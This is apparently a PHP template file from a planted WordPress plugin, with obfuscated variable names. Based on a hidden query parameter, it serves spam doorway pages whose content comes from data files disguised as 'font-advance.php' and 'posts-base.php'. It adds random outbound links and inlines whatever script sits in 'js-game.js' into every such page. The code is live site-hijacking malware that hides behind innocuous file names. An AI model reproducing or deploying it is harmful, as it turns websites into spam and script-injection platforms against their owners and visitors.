<?php
$r9EpaRGm2 = intval(get_query_var('kpqwe'));

if ($r9EpaRGm2 < 1 || $r9EpaRGm2 > 4013) return;
$ojGfFcI = file(plugin_dir_path(__FILE__).'font-advance.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$eyy0H = explode(';', $ojGfFcI[$r9EpaRGm2]);
if (count($eyy0H) < 2) return;
$fpOhaCGO = $eyy0H[0];
$xyLlCjH  = $eyy0H[1];
$h9x7P9SO1 = $eyy0H[2];
$wabDpL  = $eyy0H[3];
$pftsJ4 = $eyy0H[4];
set_query_var('axzikcdim', $fpOhaCGO);

$gjboBUs = '';
$avlQx = plugin_dir_path(__FILE__).'posts-base.php';
if (is_file($avlQx)) {
	$fxEGcoL = file($avlQx, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($fxEGcoL);
	shuffle($fxEGcoL);
	$hFWxV = mt_rand(2, 5);
	if (count($fxEGcoL) > $hFWxV) {
		for ($fPHiOn = 0; $fPHiOn < $hFWxV; $fPHiOn++) {
			$qfV4lIb = array_shift($fxEGcoL);
			$gjboBUs .= '<p><a href="'.$qfV4lIb.'">'.$qfV4lIb.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $fpOhaCGO; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $xyLlCjH . "</p>\n";
				if (strlen($wabDpL) > 0) echo "<p>" . $wabDpL . "</p>\n";
				if (strlen($h9x7P9SO1) > 0) echo "<p>" . $h9x7P9SO1 . "</p>\n";
				if (strlen($pftsJ4) > 0) echo '<p><a href="#"><img src="'.$pftsJ4.'"></a>' . "</p>\n";
				echo $gjboBUs;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$dTH1OP3 = plugin_dir_path(__FILE__) . 'js-game.js';
if (is_file($dTH1OP3)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($dTH1OP3);
	echo '</script>';
}
get_footer();
?>
